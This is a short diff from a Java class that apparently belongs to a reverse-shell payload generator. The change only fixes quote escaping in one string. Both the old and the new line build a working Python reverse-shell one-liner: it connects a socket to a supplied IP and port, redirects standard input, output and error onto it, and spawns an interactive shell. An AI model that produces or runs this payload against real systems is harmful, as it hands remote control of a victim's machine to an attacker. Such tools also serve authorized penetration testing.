@@ -8,7 +8,7 @@
 
         public Python3_shortest(String localIP, int localPort, LISTENER listener, SHELLS shellType){
             super(localIP, localPort, listener, shellType);
-            shellFormat = String.format("python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\\\"%s\\\",%s));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\\\"%s\\\")'",this.getLocalIP() ,this.getLocalPort(), this.getShell() );
+            shellFormat = String.format("python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"%s\",%s));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"%s\")'",this.getLocalIP() ,this.getLocalPort(), this.getShell() );
         }
 
         @Override
